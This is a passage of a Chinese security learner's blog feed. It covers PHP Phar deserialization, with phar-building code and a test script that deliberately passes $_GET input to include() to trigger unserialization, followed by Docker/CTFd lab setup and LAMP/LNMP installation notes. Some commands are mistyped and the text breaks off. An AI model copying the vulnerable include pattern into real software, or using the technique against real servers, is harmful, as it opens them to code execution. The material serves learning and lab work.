src="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/202112132108580.png-w331s"></p><ol start="3"><li>the file contents</li></ol><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><ol start="4"><li> a signature for verifying Phar integrity</li></ol><p>签名，放在文件末尾，格式如下：</p><p><img src="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/202112132108581.png-w331s"></p><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</p><p>注意：要将php.ini中的<code>phar.readonly</code>选项设置为<code>Off</code>，否则无法生成phar文件。</p><p><code>phar_demo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> TestObject();</span><br><span class="line">    <span class="variable">$o</span>-&gt;data = <span class="string">&#x27;seizer&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行代码后，会生成一个phar.phar的文件在当前目录下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">      Offset: <span class="number">00</span> <span class="number">01</span> <span class="number">02</span> <span class="number">03</span> <span class="number">04</span> <span class="number">05</span> <span class="number">06</span> <span class="number">07</span> <span class="number">08</span> <span class="number">09</span> <span class="number">0</span>A <span class="number">0</span>B <span class="number">0</span>C <span class="number">0</span>D <span class="number">0</span>E <span class="number">0</span>F </span><br><span class="line"><span class="number">00000000</span>: <span class="number">3</span>C <span class="number">3</span>F <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">20</span> <span class="number">5</span>F <span class="number">5</span>F <span class="number">48</span> <span class="number">41</span> <span class="number">4</span>C <span class="number">54</span> <span class="number">5</span>F <span class="number">43</span> <span class="number">4</span>F <span class="number">4</span>D    &lt;?php.__HALT_COM</span><br><span class="line"><span class="number">00000010</span>: <span class="number">50</span> <span class="number">49</span> <span class="number">4</span>C <span class="number">45</span> <span class="number">52</span> <span class="number">28</span> <span class="number">29</span> <span class="number">3</span>B <span class="number">20</span> <span class="number">3</span>F <span class="number">3</span>E <span class="number">0</span>D <span class="number">0</span>A <span class="number">64</span> <span class="number">00</span> <span class="number">00</span>    PILER();.?&gt;..d..</span><br><span class="line"><span class="number">00000020</span>: <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2</span>E    ................</span><br><span class="line"><span class="number">00000030</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">4</span>F <span class="number">3</span>A <span class="number">31</span> <span class="number">30</span> <span class="number">3</span>A <span class="number">22</span> <span class="number">54</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> <span class="number">4</span>F <span class="number">62</span> <span class="number">6</span>A    ...O:<span class="number">10</span>:<span class="string">&quot;TestObj</span></span><br><span class="line"><span class="string">00000040: 65 63 74 22 3A 31 3A 7B 73 3A 34 3A 22 64 61 74    ect&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;dat</span></span><br><span class="line"><span class="string">00000050: 61 22 3B 73 3A 36 3A 22 73 65 69 7A 65 72 22 3B    a&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;seizer&quot;</span>;</span><br><span class="line"><span class="number">00000060</span>: <span class="number">7</span>D <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> <span class="number">2</span>E <span class="number">74</span> <span class="number">78</span> <span class="number">74</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>    &#125;....test.txt...</span><br><span class="line"><span class="number">00000070</span>: <span class="number">00</span> CE E8 <span class="number">66</span> <span class="number">61</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">7</span>E <span class="number">7</span>F D8 B6 <span class="number">01</span> <span class="number">00</span>    .Nhfa.....~.X6..</span><br><span class="line"><span class="number">00000080</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">74</span> <span class="number">65</span> <span class="number">73</span> <span class="number">74</span> A6 <span class="number">98</span> F8 F3 <span class="number">51</span> ED C0    .....test&amp;.xsQm@</span><br><span class="line"><span class="number">00000090</span>: FE <span class="number">94</span> <span class="number">7</span>A E7 FC <span class="number">1</span>A <span class="number">77</span> <span class="number">1</span>D <span class="number">83</span> <span class="number">52</span> <span class="number">78</span> FD B0 <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>    ~.zg|.w..Rx&#125;<span class="number">0.</span>..</span><br><span class="line"><span class="number">000000</span>a0: <span class="number">00</span> <span class="number">47</span> <span class="number">42</span> <span class="number">4</span>D <span class="number">42</span>                                     .GBMB</span><br></pre></td></tr></table></figure><p>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/202112132108582.png"></p><p><code>phar_fan.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;phar&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功触发反序列化</p><p><img src="/post/2021-10/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/202112132108583.png" alt="image-20211013221751010"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">phar反序列化</a></p><p><a href="https://threezh1.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Phar反序列化总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfd靶场搭建过程</title>
      <link href="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
      <url>/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker为何物？"><a href="#Docker为何物？" class="headerlink" title="Docker为何物？"></a>Docker为何物？</h1><ul><li><p>官方是这样说的：Docker是一个开源的应用容器引擎，Docker可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的Linux继器上，也可以实现虚拟化。</p></li><li><p>在我理解其实就是轻量级的虚拟机，它没有了那好看的图形管理系统等甚至只需要一个服务就可以实现虚拟化！</p></li></ul><h2 id="镜像和容器"><a href="#镜像和容器" class="headerlink" title="镜像和容器"></a>镜像和容器</h2><ul><li>镜像和容器的关系就好比是类和对象，容器只是镜像的一个实例化对象，Docker镜像是用于创捷Docker容器的模板。</li></ul><h1 id="如何使用docker呢？"><a href="#如何使用docker呢？" class="headerlink" title="如何使用docker呢？"></a>如何使用docker呢？</h1><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker-ce</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><blockquote><p>便于操作我们直接换root模式</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure><blockquote><p>如果没有设置root密码请按照下面步骤</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line"><span class="meta">#</span><span class="bash"> 修改好密码之后再次进入</span></span><br><span class="line">su root</span><br></pre></td></tr></table></figure><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559829.png" alt="image-20210715211155152"></p><h2 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure><blockquote><p>使用该镜像启动容器</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure><ul><li>启动后直接进入了该容器的终端</li></ul><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559831.png" alt="image-20210715211451858"></p><p>参数说明：</p><ul><li><strong>-i</strong>: 交互式操作。</li><li><strong>-t</strong>: 终端。</li><li><strong>ubuntu</strong>: ubuntu 镜像。</li><li><strong>/bin/bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</li></ul><blockquote><p>此时已经在该容器的终端了</p></blockquote><h3 id="其他的命令"><a href="#其他的命令" class="headerlink" title="其他的命令"></a>其他的命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker images# 查看所有的镜像</span><br><span class="line">docker ps# 查看启动的容器</span><br></pre></td></tr></table></figure><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559832.png" alt="image-20210715211315727"></p><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559833.png" alt="image-20210715211357601"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a# 查看所有容器</span><br><span class="line">docker start 容器ID# 启动容器</span><br><span class="line">docker stop 容器ID# 停止容器</span><br><span class="line">dockers restart 容器ID# 重启容器</span><br><span class="line">docker rm 容器ID# 删除容器</span><br><span class="line">docker rmi 镜像name# 删除镜像</span><br><span class="line">docker attach 容器ID# 进入容器 （退出时会使容器停止）</span><br><span class="line">docker exec 容器ID# 进入容器 （退出时不会使容器停止）</span><br><span class="line">docker commit 容器ID # 根据容器的更改创建新镜像</span><br></pre></td></tr></table></figure><h1 id="使用docker和CTFd搭建靶场"><a href="#使用docker和CTFd搭建靶场" class="headerlink" title="使用docker和CTFd搭建靶场"></a>使用docker和CTFd搭建靶场</h1><ul><li>首先先把git下载下来</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt git</span><br></pre></td></tr></table></figure><ul><li>再下载CTFd</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/CTFd/CTFd.git</span><br></pre></td></tr></table></figure><ul><li>下载下来之后，</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd CTFd# 进入目录docker-compose up -d # 记得先拿root权限</span><br></pre></td></tr></table></figure><ul><li>经过耐心等待之后访问127.0.0.1发现CTFd已经部署好了，经过注册后如下：</li></ul><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559834.png" alt="image-20210715211618205"></p><blockquote><p>接下来我们使用docker容器搭建web应用程序，再使用端口映射将容器映射到不同端口上即可成功搭建靶场</p></blockquote><ul><li>For example:</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -it -p 2333:80 ubuntu# docker容器的80端口映射到主机的2333端口docker exec -it 容器ID /bin/bash# 进入终端后service apache2 status# 查看服务是否开启service apache2 start# 开启服务service apache2 stop# 关闭服务</span><br></pre></td></tr></table></figure><ul><li><strong>-P :<strong>是容器内部端口</strong>随机</strong>映射到主机的高端口。</li><li><strong>-p :</strong> 是容器内部端口绑定到<strong>指定</strong>的主机端口。</li></ul><h1 id="PuTTY远程SSH"><a href="#PuTTY远程SSH" class="headerlink" title="PuTTY远程SSH"></a>PuTTY远程SSH</h1><ul><li>今天把之前的Windows Server重置为了Ubuntu 20.04 LTS ，结果发现不能直接使用mstsc直接连接，只能远程SSH，突然感觉不香了</li></ul><blockquote><p>下载地址：<a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></p></blockquote><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559835.png" alt="img"></p><ol><li>参数举例说明如下：<ul><li>Host Name（or IP address）：公网 IP</li><li>Port：轻量应用服务器的连接端口，必须设置为22</li><li>Connect type：选择 “SSH”</li><li>Saved Sessions：填写会话名称，例如 test<br>配置 “Host Name” 后，再配置 “Saved Sessions” 并保存，则后续使用时您可直接双击 “Saved Sessions” 下保存的会话名称即可登录服务器</li></ul></li><li>单击【Open】，进入 “PuTTY” 的运行界面</li></ol><ul><li>剩余操作都是一样的，最后成果</li></ul><p><img src="/post/2021-09/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/202108291559836.png" alt="image-20210715211659628"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> DIY </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LAMP和LNMP环境搭建的艰辛历程</title>
      <link href="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/"/>
      <url>/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="LAMP环境的搭建"><a href="#LAMP环境的搭建" class="headerlink" title="LAMP环境的搭建"></a>LAMP环境的搭建</h1><blockquote><p>在图形管理化界面中依次打开系统设置、软件和更新。在下载自重选择其他站点，然后在中国的条目下选择mirrors.ustc.edu.cn。</p></blockquote><p>Ubuntu换源可参考<a href="https://mirrors.ustc.edu.cn/help/ubuntu.html">https://mirrors.ustc.edu.cn/help/ubuntu.html</a></p><blockquote><p>更新资源包:sudo apt update</p><p>更新软件:sudo apt upgrade</p><p>清除不需要的软件:sudo apt autoremove</p><p>清除不需要的文件:sudo apt autoclean</p></blockquote><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>接下来就可以进入正式搭建了</p><blockquote><p>su root                     //方便之后更快的操作，切换root用户</p><p>apt install apache2</p></blockquote><p>默认的配置文件:/etc/apache2/sites-enabled/000-default.conf</p><p>默认网站根目录:/var/www/html</p><p>安装完成之后<strong>检查apache是否开启</strong>:</p><blockquote><p>service apache2 status            // 查看apache是否开启</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559990.png" alt="image-20210730172438646"></p><blockquote><p>service apache2 stop            // 关闭apache服务</p><p>service apache2 start            // 打开apache服务</p><p>service apache2 restart        //重启apache服务</p></blockquote><p>也可以查看80端口是否开启</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559991.png" alt="image-20210730172703746"></p><h3 id="安装apache遇到的问题"><a href="#安装apache遇到的问题" class="headerlink" title="安装apache遇到的问题"></a>安装apache遇到的问题</h3><p>安装过程中发现apache启动不了，使用</p><blockquote><p>systemctl status apache2         查看apache服务的状态</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559992.png" alt="image-20210730173206831"></p><p>查阅资料和翻译英语得知是80端口被占用所以开启不了apache服务</p><blockquote><p>netstat -ntulp|grep 80    // 查看80端口</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559993.png" alt="image-20210730173427993"></p><p>这我才发现是因为之前搭建靶场时docker容器占用了80端口，只要把容器停止就好了</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog1/202108291559994.png" alt="image-20210730173713326"></p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><blockquote><p>apt install mysql-server</p></blockquote><p>mysql的配置文件: /etc/mysql/mysql.conf.d/mysqld.cnf</p><h3 id="登录mysql的方法"><a href="#登录mysql的方法" class="headerlink" title="登录mysql的方法"></a>登录mysql的方法</h3><ol><li>cat /etc/mysql/debian.cnf查看默认用户的密码</li></ol><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559995.png" alt="image-20210730174354524"></p><blockquote><p>mysql -u debian-sys-maint -p</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559996.png" alt="image-20210730174449794"></p><blockquote><p> 修改密码:</p><p>注：8.0以上版本 ‘password’ 字段已经不管用了，会报错，相关的命令比如：<code>update mysql.user set password=&#39;newpassword&#39; where user=&#39;root&#39;;</code>一同失效</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;你的密码&#x27;</span>;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><blockquote><p>Ctrl+Z退出mysql，重新运行，使用新密码登录，完成</p></blockquote><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>apt install php7.4</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559997.png" alt="image-20210730182358690"></p><p>测试php是否安装成功</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559998.png" alt="image-20210730182527561"></p><p>安装php组件：</p><blockquote><p>apt install apt install php-curlphp.cgi php-json</p></blockquote><p>php-curl：curl是一个库，能让你通过URL和许多不同种的服务器进行勾搭、搭讪和深入交流，并且还支持许多协议。并且人家还说了curl可以支持https认证、http post、ftp上传、代理、cookies、简单口令认证等等功能啦。</p><p>php.cgi:    cgi是 (common gateway interface)通用网关接口 .php-cgi是php提供给web serve也就是http前端服务器的cgi协议接口程序，当每次接到http前端服务器的请求都会开启一个php-cgi进程进行处理。</p><p>php-json: json 序列化相关操作</p><p>安装php扩展：</p><blockquote><p>apt install php-pear libapache2-mod-php php-mysql</p></blockquote><p>php-pear: Pear 是“PHP Extension and Application Repository”的缩写，即PHP扩展和应用仓库。Pear 将PHP程序开发过程中常用的功能编写成类库，涵盖了页面呈现、数据库访问、文件操作、数据结构、缓存操作、网络协议、WebService 等许多方面，用户可以通过下载这些类库并适当的作一些定制以实现自己需要的功能。避免重复发明“车轮”。Pear 的出现大大提高了PHP 程序的开发效率和开发质量。</p><p>libapache2-mod-php:我猜测应该是对apache php解析的一个增强</p><p>php-mysql: 关于php对数据库操作的函数</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559999.png" alt="image-20210730190357602"></p><h1 id="Lnmp环境的搭建"><a href="#Lnmp环境的搭建" class="headerlink" title="Lnmp环境的搭建"></a>Lnmp环境的搭建</h1><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><blockquote><p>停止apache服务        service apache2 stop</p><p>安装nginx                    apt install nginx</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559000.png" alt="image-20210730230840603"></p><h2 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h2><blockquote><p>apt install php7.4-fpm</p></blockquote><blockquote><p>vim /etc/nginx/sites-available/default</p></blockquote><p>在56行做如下修改</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559001.png" alt="image-20210730231157601"></p><blockquote><p>service nginx restart                // 重启服务即可</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559002.png" alt="image-20210730231448845"></p><p>或者还可以这样</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559003.png" alt="image-20210730231007177"></p><p>然后这样</p><blockquote><p>vim /etc/php/7.4/fpm/pool.d/<a href="http://www.conf/">www.conf</a></p></blockquote><p>在37行加入下面这句话</p><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559004.png" alt="image-20210730231620847"></p><blockquote><p>service php7.4-fpm restart                //重启服务即可</p></blockquote><p><img src="/post/2021-09/LAMP%E5%92%8CLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E7%9A%84%E8%89%B0%E8%BE%9B%E5%8E%86%E7%A8%8B/202108291559005.png" alt="image-20210730231747532"></p><h1 id="配置PHP环境中出现的一些问题"><a href="#配置PHP环境中出现的一些问题" class="headerlink" title="配置PHP环境中出现的一些问题"></a>配置PHP环境中出现的一些问题</h1><p>PHP运行目前为止主要的三种方式：</p><ol><li>以模块加载的方式运行——将PHP集成到Apache服务器，以同一个进程运行。</li><li>以CGI的方式运行——Apache在遇到PHP脚本的时候会将PHP程序提交给CGI应用程序（php-cgi.exe）解释，解释之后的结果返回给Apache，最后再返回给相应的请求用户。</li><li>以FastCGI的方式运行——CGI的加强版本，CGI是单进程，多线程的运行方式，程序执行完成之后就会销毁，所以每次都需要加载配置和环境变量fork-and-execute（创建-执行）。而FastCGI则不同，FastCGI像是一个常驻 (long-live) 型的CGI，只要激活后，在web服务器启动时就开启了一个进程，它可以一直执行着，不会每次都要花费时间去fork一个进程(CGI最为人诟病的fork-and-execute模式)。</li></ol><h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><blockquote><p> CGI(Common Gateway Interface)公共网关接口是HTTP服务器与机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。</p><p>工作原理：CGI程序根据请求提交的参数作相应处理，然后输出标准的html语句返回给web server，web server再返回给客户端。</p></blockquote><p>简单的说：cgi就是专门用来和web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序(php的fastcgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句返回给web服务器，再返回给客户端，这就是普通cgi的工作原理。</p><h2 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h2><blockquote><p> FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次(这是CGI最为人诟病的fork-and-execute 模式)。它还支持分布式的运算, 即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。</p></blockquote><p>传统的cgi协议在每次连接请求时，会开启一个进程进行处理，处理完毕会关闭该进程，因此下次连接，又要再次开启一个进程进行处理，因此有多少个连接就有多少个cgi进程，这也就是为什么传统的cgi会显得缓慢的原因，因此过多的进程会消耗资源和内存。而fast-cgi则是一个进程可以处理多个请求（这里的意思不是说一个进程可以同时处理多个请求，二十因为fastcgi是常驻cgi，不需要花费时间去fork进程），和上面的cgi协议完全不一样，cgi是一个进程只能处理一个请求，这样就会导致大量的cgi程序，因此会给服务器带来负担。</p><p>FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。</p><p><strong>工作原理</strong></p><ol><li>Web Server启动时载入FastCGI进程管理器（IIS 